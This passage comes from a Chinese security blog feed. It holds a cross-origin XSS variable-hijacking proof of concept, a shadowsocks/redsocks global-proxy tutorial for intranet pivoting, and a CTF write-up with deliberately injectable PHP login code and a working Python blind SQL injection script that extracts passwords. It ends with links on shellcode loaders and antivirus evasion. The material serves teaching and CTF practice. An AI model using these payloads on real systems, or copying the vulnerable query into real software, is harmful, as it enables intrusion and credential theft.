<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- B.com/B.html --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span>  <span class="attr">src</span>=<span class="string">"http://C.com/C.html"</span> &gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">onclick</span>=<span class="string">"test()"</span>&gt;</span>click me<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">     VUL = <span class="string">"Hijack me"</span>;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="comment">// 不能用alert ，alert 会尝试访问 VUL window对象的特有方法，会爆跨域错误</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(VUL);</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>利用的poc如下,修改A.html如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">loaded</span><span class="params">(x)</span></span>&#123;</span></span><br><span class="line"><span class="actionscript">        x.contentWindow.frames[<span class="number">0</span>].location = <span class="string">"http://A.com/index.html"</span>; <span class="comment">// 修改为跟A.com同源，这样在修改此iframe的name的时候就不会被同源策略block</span></span></span><br><span class="line"><span class="actionscript">        setTimeout(<span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">'setting viewer...'</span>);</span></span><br><span class="line"><span class="actionscript">            x.contentWindow.frames[<span class="number">0</span>].name = <span class="string">"VUL"</span>; <span class="comment">// 重新定义全局变量</span></span></span><br><span class="line">        &#125;,1000);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--  </span></span><br><span class="line"><span class="comment">    http://B.com/B.html?xss=%3Cscript%3E%0A%20%20%20%20%20VUL%20=%20%22Hijack%20me%22;%0A%3C/script%3E</span></span><br><span class="line"><span class="comment">    利用chrome的filter模式去掉 VUL 的定义 </span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span>  <span class="attr">src</span>=<span class="string">"http://B.com/B.html?xss=%3Cscript%3E%0A%20%20%20%20%20VUL%20=%20%22Hijack%20me%22;%0A%3C/script%3E"</span> <span class="attr">onload</span>=<span class="string">"loaded(this)"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后访问 A.com/A.html ，就会发现 B.com/B.html 中的 <code>VUL</code> 已经被劫持了。</p>
<h2 id="0x6-进一步利用"><a href="#0x6-进一步利用" class="headerlink" title="0x6 进一步利用"></a>0x6 进一步利用</h2><p>由于我们控制了 <code>B.com/B.html</code> 中的 iframe 指向了 <code>http://A.com/index.html</code> , 所以此时 B 想访问 <code>VUL</code> 对象的子属性是不行的，因为是跨域的。 </p>
<p>比如 <code>B.com/B.html</code> 有如下代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// 不能用alert ，alert 会尝试访问 VUL window对象的特有方法，会爆跨域错误</span></span><br><span class="line">    <span class="comment">// console.log(VUL);</span></span><br><span class="line">    config  = VUL.config ； <span class="comment">// 这一句一定会报错</span></span><br><span class="line">    alert(config.name); <span class="comment">// 也一定会报错 。。。。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>为了解决这个问题，我们还可以在 <code>http://A.com/index.html</code> 这个页面上做文章，做法就是再插入一个iframe </p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- http://A.com/index.html --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- http://B.com/C.html 是存在的 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span>  <span class="attr">name</span>=<span class="string">"config"</span> <span class="attr">src</span>=<span class="string">"http://B.com/C.html"</span> &gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>此时在 B.com 访问 <code>VUL.config</code> 就不会报错，而且访问 <code>config.name</code>时，如果 <code>http://B.com/C.html</code> 存在这个全局变量就不会报错，因为此时 <code>B.com</code> 访问 <code>VUL.config</code> 的一切属性都不会报错了，因为没有跨域。</p>
]]></content>
      <categories>
        <category>hack_ctf</category>
      </categories>
      <tags>
        <tag>xss, web前端 , javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>在linux上把shadowsocks做成全局代理</title>
    <url>/2016/05/16/%E5%9C%A8linux%E4%B8%8A%E6%8A%8Ashadowsocks%E5%81%9A%E6%88%90%E5%85%A8%E5%B1%80%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[<p><strong>0x1.背景介绍.</strong> 内网渗透相信大家都搞过,怎么把自己带进内网里面,方法也是多种多样,比较流行的有:</p>
<a id="more"></a>

<ul>
<li>reGeorg</li>
<li>socks5</li>
<li>meterpreter</li>
<li>ssh  -D 动态socks5 转发 (要求root权限)</li>
</ul>
<p>等等……   , 方法挺多的,但是用这些代理出来之后,如果不进行任何处理,就是仅仅支持socks代理,让浏览器代理上网,对于不支持socks代理的软件,how to do …..??       就算软件支持socks5代理,一个软件一个软件设代理,我想即使不是处女座也会受不了的,所以我们需要一个更好的解决方案. <strong>0x2.尝试过的解决方案</strong></p>
<ul>
<li><p>如果你是windows, proxifier就是你的终极解决方案,啥是proxifier,百度一下呗</p>
<pre><code>软件像这样,来贴个图</code></pre></li>
</ul>
<p><img src="http://pic.wonderkun.cc/uploads/2016/05/35358077_1.jpg" alt="http://pic.wonderkun.cc/uploads/2016/05/35358077_1.jpg"></p>
<p>啥?不会用,当然百度啦……</p>
<ul>
<li>如果你是像我这样的linux爱好者,就继续看下去吧.</li>
</ul>
<p>不得不说proxychains是可以用的,而且用起来挺好,但是每次运行一个软件都需要在前面加一个proxychains,有时候也会觉得很麻烦,</p>
<p> 而且还有一些软件不吃proxychains的那一套,做不上代理,这就需要下面的这个解决方案了.</p>
<p><strong>0x3.我认为的终极解决方案   iptables + redsocks</strong></p>
<p>一.首先先下载编译redsocks </p>
<pre><code class="bash">git <span class="built_in">clone</span> https://github.com/darkk/redsocks 
<span class="built_in">cd</span> redsocks 
make   <span class="comment">#编译一下,此目录下的redsocks 就是可执行程序 </span></code></pre>
<p>需要注意的是,redsocks依赖libevent,如果没有安装的话,make的时候将会报错: ubuntu/debain系统通过以下命令安装: </p>
<pre><code class="bash">sudo apt-get install libevent-dev </code></pre>
<p>Redhat/Centos通过以下命令安装 </p>
<p>``<br>sudo yum install libevent-dev </p>
<pre><code>
二,运行你的shadowsocks的客户端,默认大家都会用啊, 
</code></pre><p>root@wonderkun-pc:~/Desktop/github/redsocks$ sslocal -s ip  -k  password -p remote_port<br>2016-05-16 21:18:09 INFO loading libcrypto from libcrypto.so.1.0.2 2016-05-16 21:18:09 INFO starting local at 127.0.0.1:1080 </p>
<pre><code>
三.配置redsocks. </code></pre><p>cp   redsocks.conf.example   redsocks.conf </p>
<pre><code>对redsocks.conf 做如下修改:(修改的地方已经标注) 
```bash 
base {
// debug: connection progress
log_debug = on;

// info: start and end of client session
log_info = on;

/* possible `log&apos; values are:
* stderr
* &quot;file:/path/to/file&quot;
* syslog:FACILITY facility is any of &quot;daemon&quot;, &quot;local0&quot;...&quot;local7&quot;
*/
log = stderr;
// log = &quot;file:/path/to/file&quot;;
// log = &quot;syslog:local7&quot;;

// detach from console
daemon = off;

/* Change uid, gid and root directory, these options require root
* privilegies on startup.
* Note, your chroot may requre /etc/localtime if you write log to syslog.
* Log is opened before chroot &amp; uid changing.
* Debian, Ubuntu and some other distributions use `nogroup` instead of
* `nobody`, so change it according to your system if you want redsocks
* to drop root privileges.
*/
// user = nobody;
// group = nobody;
// chroot = &quot;/var/chroot&quot;;

/* possible `redirector&apos; values are:
* iptables - for Linux
* ipf - for FreeBSD
* pf - for OpenBSD
* generic - some generic redirector that MAY work
*/
redirector = iptables;

/* Override per-socket values for TCP_KEEPIDLE, TCP_KEEPCNT,
* and TCP_KEEPINTVL. see man 7 tcp for details.
* `redsocks&apos; relies on SO_KEEPALIVE option heavily. */
//tcp_keepalive_time = 0;
//tcp_keepalive_probes = 0;
//tcp_keepalive_intvl = 0;

// Every `redsocks` connection needs two file descriptors for sockets.
// If `splice` is enabled, it also needs four file descriptors for
// pipes. `redudp` is not accounted at the moment. When max number of
// connection is reached, redsocks tries to close idle connections. If
// there are no idle connections, it stops accept()&apos;ing new
// connections, although kernel continues to fill listenq.

// Set maximum number of open file descriptors (also known as `ulimit -n`).
// 0 -- do not modify startup limit (default)
// rlimit_nofile = 0;

// Set maximum number of served connections. Default is to deduce safe
// limit from `splice` setting and RLIMIT_NOFILE.
// redsocks_conn_max = 0;

// Close connections idle for N seconds when/if connection count
// limit is hit.
// 0 -- do not close idle connections
// 7440 -- 2 hours 4 minutes, see RFC 5382 (default)
// connpres_idle_timeout = 7440;

// `max_accept_backoff` is a delay in milliseconds to retry `accept()`
// after failure (e.g. due to lack of file descriptors). It&apos;s just a
// safety net for misconfigured `redsocks_conn_max`, you should tune
// redsocks_conn_max if accept backoff happens.
// max_accept_backoff = 60000;
}

redsocks {
/* `local_ip&apos; defaults to 127.0.0.1 for security reasons,
* use 0.0.0.0 if you want to listen on every interface.
* `local_*&apos; are used as port to redirect to.
*/
local_ip = 127.0.0.1;
local_port = 12345;    #这个端口默认就行,只要跟你以后iptables,重定向的端口一样就ok

// listen() queue length. Default value is SOMAXCONN and it should be
// good enough for most of us.
// listenq = 128; // SOMAXCONN equals 128 on my Linux box.

// Enable or disable faster data pump based on splice(2) syscall.
// Default value depends on your kernel version, true for 2.6.27.13+
// splice = false;

// `ip&apos; and `port&apos; are IP and tcp-port of proxy-server
// You can also use hostname instead of IP, only one (random)
// address of multihomed host will be used.
ip = 127.0.0.1;    #如果你是在本地开的shadowsocks客户端,地址就是127.0.0.1
port = 1080;        #shadowsocks  客户端的端口,默认就是1080

// known types: socks4, socks5, http-connect, http-relay
type = socks5;

// login = &quot;foobar&quot;;
// password = &quot;baz&quot;;

// known ways to disclose client IP to the proxy:
// false -- disclose nothing
// http-connect supports:
// X-Forwarded-For -- X-Forwarded-For: IP
// Forwarded_ip -- Forwarded: for=IP # see RFC7239
// Forwarded_ipport -- Forwarded: for=&quot;IP:port&quot; # see RFC7239
// disclose_src = false;

// various ways to handle proxy failure
// close -- just close connection (default)
// forward_http_err -- forward HTTP error page from proxy as-is
// on_proxy_fail = close;
}

redudp {
// `local_ip&apos; should not be 0.0.0.0 as it&apos;s also used for outgoing
// packets that are sent as replies - and it should be fixed
// if we want NAT to work properly.
local_ip = 127.0.0.1;
local_port = 10053;

// `ip&apos; and `port&apos; of socks5 proxy server.
ip = 10.0.0.1;
port = 1080;
login = username;
password = pazzw0rd;

// redsocks knows about two options while redirecting UDP packets at
// linux: TPROXY and REDIRECT. TPROXY requires more complex routing
// configuration and fresh kernel (&gt;= 2.6.37 according to squid
// developers[1]) but has hack-free way to get original destination
// address, REDIRECT is easier to configure, but requires `dest_ip` and
// `dest_port` to be set, limiting packet redirection to single
// destination.
// [1] http://wiki.squid-cache.org/Features/Tproxy4
dest_ip = 8.8.8.8;
dest_port = 53;

udp_timeout = 30;
udp_timeout_stream = 180;
}

dnstc {
// fake and really dumb DNS server that returns &quot;truncated answer&quot; to
// every query via UDP, RFC-compliant resolver should repeat same query
// via TCP in this case.
local_ip = 127.0.0.1;
local_port = 5300;
}

// you can add more `redsocks&apos; and `redudp&apos; sections if you need.</code></pre><p>修改完成之后,直接./redsocks 就跑起来了 </p>
<p>三.最重要的来了,配置iptables 我写了一个脚本附带注释,方便不太懂iptables的筒子们来使用 </p>
<pre><code class="bash"><span class="comment">#file name iptables.sh</span>

<span class="meta">#!/bin/bash</span>
<span class="keyword">if</span> [ <span class="variable">$#</span> -lt 1 ]

<span class="comment">#不重定向目的地址为服务器的包</span>
<span class="keyword">then</span>
    <span class="built_in">echo</span> -en <span class="string">"\n"</span>

    <span class="built_in">echo</span> <span class="string">"Iptables redirect script to support global proxy on ss for linux ... "</span>
    <span class="built_in">echo</span> -en <span class="string">"\n"</span>
    <span class="built_in">echo</span> <span class="string">"Usage : <span class="variable">${0}</span> action [options]"</span>
    <span class="built_in">echo</span> <span class="string">"Example:"</span>
    <span class="built_in">echo</span> -en <span class="string">"\n"</span>
    <span class="built_in">echo</span> <span class="string">"<span class="variable">${0}</span> start server_ip To start global proxy"</span>
    <span class="built_in">echo</span> <span class="string">"<span class="variable">${0}</span> stop To stop global proxy"</span>
    <span class="built_in">echo</span> -en <span class="string">"\n"</span>

<span class="keyword">else</span>
    <span class="keyword">if</span> [ <span class="variable">${1}</span> == <span class="string">'stop'</span> ]
    <span class="keyword">then</span>
        <span class="built_in">echo</span> <span class="string">"stoping the Iptables redirect script ..."</span>
        sudo iptables -t nat -F
   <span class="keyword">fi</span>
   <span class="keyword">if</span>     [ <span class="variable">${1}</span> == <span class="string">'start'</span> ]
   <span class="keyword">then</span>
       <span class="keyword">if</span>    [ <span class="variable">$#</span> -lt 2 ]
       <span class="keyword">then</span>
            <span class="built_in">echo</span> -e <span class="string">"\033[49;31mPlease input the server_ip ...\033[0m"</span>
       <span class="keyword">else</span>
           <span class="comment">##不重定向目的地址为服务器的包  </span>
           sudo iptables -t nat -A OUTPUT -d <span class="variable">${2}</span> -j RETURN <span class="comment">#请用你的shadowsocks服务器的地址替换$SERVER_IP</span>
           <span class="comment"># #不重定向私有地址的流量</span>
           sudo iptables -t nat -A OUTPUT -d 10.0.0.0/8 -j RETURN
           sudo iptables -t nat -A OUTPUT -d 172.16.0.0/12 -j RETURN
           sudo iptables -t nat -A OUTPUT -d 192.168.0.0/16 -j RETURN

           <span class="comment">#不重定向保留地址的流量,这一步很重要</span>
           sudo iptables -t nat -A OUTPUT -d 127.0.0.0/8 -j RETURN

            <span class="comment"># #重定向所有不满足以上条件的流量到redsocks监听的12345端口</span>
           sudo iptables -t nat -A OUTPUT -p tcp -j REDIRECT --to-ports 12345 <span class="comment">#12345是你的redsocks运行的端口,请根据你的情况替换它</span>
     <span class="keyword">fi</span>
  <span class="keyword">fi</span>
<span class="keyword">fi</span>
</code></pre>
<p>使用方法: </p>
<pre><code>./iptables.sh   start  ip     #ip是你的shadowsocks服务器的ip,开启全局代理 
./iiptables.sh  stop   #结束全局代理,这句是不用全局代理之后,必须运行的,否则是没有办法上网的 </code></pre><p><strong>0x4.个人使用测试</strong> </p>
<p>因为ip这东西也是个人的隐私,所以就不贴图了 OK,好了</p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>shadowsocks</tag>
      </tags>
  </entry>
  <entry>
    <title>基于union查询的盲注(感谢pcat牛不吝赐教)</title>
    <url>/2017/02/26/%E5%9F%BA%E4%BA%8Eunion%E6%9F%A5%E8%AF%A2%E7%9A%84%E7%9B%B2%E6%B3%A8(%E6%84%9F%E8%B0%A2pcat%E7%89%9B%E4%B8%8D%E5%90%9D%E8%B5%90%E6%95%99)/</url>
    <content><![CDATA[<h3 id="代码如下"><a href="#代码如下" class="headerlink" title="代码如下:"></a>代码如下:</h3><a id="more"></a>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  $dbhost = <span class="string">"localhost"</span>;</span><br><span class="line">  $dbuser = <span class="string">"root"</span>;</span><br><span class="line">  $dbpass = <span class="string">"123456"</span>;</span><br><span class="line">  $db = <span class="string">"ctf"</span>;</span><br><span class="line">  $conn = mysqli_connect($dbhost,$dbuser,$dbpass,$db);</span><br><span class="line">  mysqli_set_charset($conn,<span class="string">"utf8"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* sql</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     create  table `admin` (</span></span><br><span class="line"><span class="comment">        `id` int(10) not null primary key auto_increment,</span></span><br><span class="line"><span class="comment">        `username` varchar(20) not null ,</span></span><br><span class="line"><span class="comment">        `password` varchar(32) not null</span></span><br><span class="line"><span class="comment">     );</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span>   <span class="title">filter</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">      $filterlist = <span class="string">"/\(|\)|username|password|where|</span></span><br><span class="line"><span class="string">      case|when|like|regexp|into|limit|=|for|;/"</span>;</span><br><span class="line">      <span class="keyword">if</span>(preg_match($filterlist,strtolower($str)))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"illegal input!"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> $str;</span><br><span class="line">  &#125;</span><br><span class="line">$username = <span class="keyword">isset</span>($_POST[<span class="string">'username'</span>])?</span><br><span class="line">filter($_POST[<span class="string">'username'</span>]):<span class="keyword">die</span>(<span class="string">"please input username!"</span>);</span><br><span class="line">$password = <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])?</span><br><span class="line">filter($_POST[<span class="string">'password'</span>]):<span class="keyword">die</span>(<span class="string">"please input password!"</span>);</span><br><span class="line">$sql = <span class="string">"select * from admin where  username =</span></span><br><span class="line"><span class="string"> '$username' and password = '$password' "</span>;</span><br><span class="line"></span><br><span class="line">$res = $conn -&gt; query($sql);</span><br><span class="line"><span class="keyword">if</span>($res-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">  $row = $res -&gt; fetch_assoc();</span><br><span class="line">  <span class="keyword">if</span>($row[<span class="string">'id'</span>])&#123;</span><br><span class="line">     <span class="keyword">echo</span> $row[<span class="string">'username'</span>];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"The content in the password column is the flag!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>题目说 password的字段的值,就是flag.那就要想办法读取password的内容</p>
<p>但是题目的过滤规则还是比较坑的:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$filterlist = <span class="string">"/\(|\)|username|password|where|</span></span><br><span class="line"><span class="string">case|when|like|regexp|into|limit|=|for|;/"</span>;</span><br></pre></td></tr></table></figure>
<p>这些字符都不能出现,限制的比较坑的有一下两条:</p>
<ol>
<li>没有了括号,标志着没有办法用mysql里的函数了.</li>
<li>没有了password,但是它却是字段名,所以sql语句中不能出现password这个列名</li>
</ol>
<p>想搞明白,先看下面两个sql语句<br><img src="http://pic.wonderkun.cc/uploads/2017/02/1.png" alt="http://pic.wonderkun.cc/uploads/2017/02/1.png"><br>mysql的字符串排序操作是从前往后一一用ascii码比对的.我们可以利用这个特性,来进行注入.</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> ctf.admin  <span class="keyword">where</span> username = <span class="string">'admin'</span>  <span class="keyword">union</span></span><br><span class="line"><span class="keyword">distinct</span>  <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">0x38</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span> <span class="keyword">desc</span> ;</span><br></pre></td></tr></table></figure>
<p>我们可以控制后面的那个查询的第三个字段,让他从最小开始变化,当查询结果第一条返回的username字段是2的时候,我们就知道这个字符的ascii码减一就是跟数据库中的相等.所以就可以一位一位的猜出来password字段了.</p>
<p>但是在操作之前,我们需要先得到数据库中的用户名,这个简单</p>
<figure class="highlight parser3"><table><tr><td class="code"><pre><span class="line"><span class="xml">只需要提交: username='</span><span class="keyword">^1</span><span class="keyword">^1</span><span class="xml">#&amp;password=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>就可以看到一个用户名了.<br>python的poc如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">makeStr</span><span class="params">(begin,end)</span>:</span></span><br><span class="line">    str=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(begin,end):</span><br><span class="line">        str+=chr(i)</span><br><span class="line">    <span class="keyword">return</span> str</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getPassword</span><span class="params">()</span>:</span></span><br><span class="line">    url=<span class="string">"http://127.0.0.1/web200/index.php"</span></span><br><span class="line">    testStr = makeStr(<span class="number">48</span>,<span class="number">127</span>)</span><br><span class="line">    username = <span class="string">"admin' union distinct select 1,2,0x&#123;hex&#125; order by 3 desc#"</span></span><br><span class="line">    flag = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span>  _  <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> testStr:</span><br><span class="line">            data = &#123;<span class="string">"username"</span>:username.format(hex=(flag+i).encode(<span class="string">'hex'</span>)),<span class="string">"password"</span>:<span class="string">'1'</span>&#125;</span><br><span class="line">            res = requests.post(url,data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"admin"</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                flag= flag+chr(ord(i)<span class="number">-1</span>)</span><br><span class="line">                <span class="keyword">print</span> flag</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"[*]"</span>,i</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__== <span class="string">'__main__'</span>:</span><br><span class="line">    getPassword()</span><br></pre></td></tr></table></figure>
<p>但是这里有个bug,因为mysql不区分大小写,他认为 D与d相等的,所以最后跑出来的,全是大写的:<br><img src="http://pic.wonderkun.cc/uploads/2017/02/2.png" alt="http://pic.wonderkun.cc/uploads/2017/02/2.png"></p>
<p>发现一种可以区分大小写的方法,利用binary：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span>  <span class="string">'ab'</span>  <span class="keyword">union</span> <span class="keyword">select</span> <span class="built_in">binary</span> <span class="string">'Ab'</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span> ;</span><br></pre></td></tr></table></figure>
<p>在后面加上binary，这样就区分大小写了。</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="code">+----+</span></span><br><span class="line">| ab |</span><br><span class="line"><span class="code">+----+</span></span><br><span class="line">| Ab |</span><br><span class="line">| ab |</span><br><span class="line"><span class="code">+----+</span></span><br></pre></td></tr></table></figure>
<p>binary用例：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> username <span class="keyword">form</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="built_in">binary</span> username <span class="keyword">like</span> <span class="string">'%admin%'</span>;</span><br></pre></td></tr></table></figure>
<p>那么大写的Admin就不会被查询出来。</p>
]]></content>
      <categories>
        <category>hack_ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>sql inject</tag>
      </tags>
  </entry>
  <entry>
    <title>安全的矛与盾-知识导航</title>
    <url>/2122/12/16/%E5%AE%89%E5%85%A8%E7%9A%84%E7%9F%9B%E4%B8%8E%E7%9B%BE-%E7%9F%A5%E8%AF%86%E5%AF%BC%E8%88%AA/</url>
    <content><![CDATA[<p>非常欢迎大家加入我的知识星球。</p>
<!-- ![](https://pic.wonderkun.cc//uploads/note/202205012323791.png) -->

<img src="https://pic.wonderkun.cc//uploads/note/202205012323791.png" width="50%" height="50%" />

<p>以下列表是我在星球中做的一些技术分享，进入该索引的文章通常是我认为比较代表性必看的一类文章，基础知识部分包含了我认为是在本知识星球进行学习必备的知识，具备基础知识后的后续内容会按照分类整理依次整理，并及时更新。</p>
<p><strong>当前更新时间：2022年6月8日。</strong></p>
<a id="more"></a>

<h2 id="基础知识篇"><a href="#基础知识篇" class="headerlink" title="基础知识篇"></a>基础知识篇</h2><ul>
<li><a href="https://t.zsxq.com/02uRbuZrv" target="_blank" rel="noopener">CS的shellcode功能分析和代码重写实战</a></li>
</ul>
<h2 id="红队建设"><a href="#红队建设" class="headerlink" title="红队建设"></a>红队建设</h2><ul>
<li><a href="https://t.zsxq.com/02BeMFuzN" target="_blank" rel="noopener">精简JRE,打造无依赖的Java-ShellCode-Loader</a></li>
<li><a href="https://t.zsxq.com/uVJqj6u" target="_blank" rel="noopener">Jna加载shellcode优化</a></li>
<li><a href="https://t.zsxq.com/a23zfyR" target="_blank" rel="noopener">绕过安全软件对windows提权的拦截的方法</a></li>
<li><a href="https://t.zsxq.com/a23zfyR" target="_blank" rel="noopener">用一个技巧编写一段兼容x86和x64的shellcode</a></li>
<li><a href="https://t.zsxq.com/a23zfyR" target="_blank" rel="noopener">CobaltStrike隐匿性部署方案</a></li>
<li><a href="https://t.zsxq.com/aMz7y3v" target="_blank" rel="noopener">静态免杀实战</a></li>
<li><a href="https://t.zsxq.com/aMz7y3v" target="_blank" rel="noopener">从服务创建拦截看端上主防软件的工作原理和绕过方法</a></li>
<li><a href="https://t.zsxq.com/eIeYBUF" target="_blank" rel="noopener">windows服务工作原理和服务隐藏</a></li>
</ul>
<h3 id="红队免杀"><a href="#红队免杀" class="headerlink" title="红队免杀"></a>红队免杀</h3><ul>
<li><a href="https://www.anquanke.com/post/id/242548" target="_blank" rel="noopener">杀软的无奈——基础工具篇（一）</a></li>
<li><a href="https://www.anquanke.com/post/id/242549" target="_blank" rel="noopener">杀软的无奈-最简单的免杀（二）</a></li>
<li><a href="https://www.anquanke.com/post/id/242550" target="_blank" rel="noopener">杀软的无奈-metasploit的shellcode loader分析（三）</a></li>
<li><a href="https://www.anquanke.com/post/id/242551" target="_blank" rel="noopener">杀软的无奈-手工构建免杀的ELF文件（四）</a></li>
<li><a href="https://www.anquanke.com/post/id/248688" target="_blank" rel="noopener">杀软的无奈-构建更具有欺骗性的ELF文件（五）</a></li>
</ul>
<h2 id="检测逃避"><a href="#检测逃避" class="headerlink" title="检测逃避"></a>检测逃避</h2><ul>
<li><a href="https://t.zsxq.com/Vbaiuvr" target="_blank" rel="noopener">滥用具备RWX-S权限且有签名的dll进行无感知的shellcode注入</a></li>
<li><a href="https://t.zsxq.com/iqvJQbm" target="_blank" rel="noopener">浅谈php webshell的检测和防御</a></li>
<li><a href="https://t.zsxq.com/yVNjI2n" target="_blank" rel="noopener">linux样本对抗文件采集和沙箱分析的方法</a></li>
<li><a href="https://t.zsxq.com/yVNjI2n" target="_blank" rel="noopener">mount命令在对抗入侵检测时的用处</a></li>
<li><a href="https://t.zsxq.com/N7UVRrV" target="_blank" rel="noopener">ring3层干掉杀软的方法</a></li>
<li><a href="https://t.zsxq.com/rRBQZVN" target="_blank" rel="noopener">windows平台的进程链隐藏小技巧</a></li>
<li><a href="https://t.zsxq.com/rRBQZVN" target="_blank" rel="noopener">upx变形壳静态脱壳工具的诞生</a></li>
</ul>
<h2 id="蓝队技术"><a href="#蓝队技术" class="headerlink" title="蓝队技术"></a>蓝队技术</h2><ul>
<li><a href="https://t.zsxq.com/yvrNV7y" target="_blank" rel="noopener">MySql高交互反制蜜罐的工程化实现</a></li>
<li><a href="https://t.zsxq.com/yvrNV7y" target="_blank" rel="noopener">收集到的几种蓝队源码下毒反制方法</a></li>
</ul>
<h2 id="论文技术前瞻"><a href="#论文技术前瞻" class="headerlink" title="论文技术前瞻"></a>论文技术前瞻</h2><ul>
<li><a href="https://t.zsxq.com/Ay7aimM" target="_blank" rel="noopener">使用迁移学习进行二进制反汇编并识别函数</a></li>
</ul>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><ul>
<li><a href="https://t.zsxq.com/eYJiEUj" target="_blank" rel="noopener">CVE-2021-22205 gitlab RCE preauth分析</a></li>
</ul>
<p><strong>持续更新中…</strong></p>
<h2 id="分享计划"><a href="#分享计划" class="headerlink" title="分享计划"></a>分享计划</h2><p>我的博客即将同步至腾讯云开发者社区，邀请大家一同入驻：<a href="https://cloud.tencent.com/developer/support-plan?invite_code=2x40wz1s57ggg" target="_blank" rel="noopener">https://cloud.tencent.com/developer/support-plan?invite_code=2x40wz1s57ggg</a></p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>binary</tag>
        <tag>blue &amp; red</tag>
        <tag>windows</tag>
        <tag>shellcode</tag>
      </tags>
  </entry>
  <entry>
    <title>有意思的线性表操作(捡起我遗忘多年的c语言)</title>
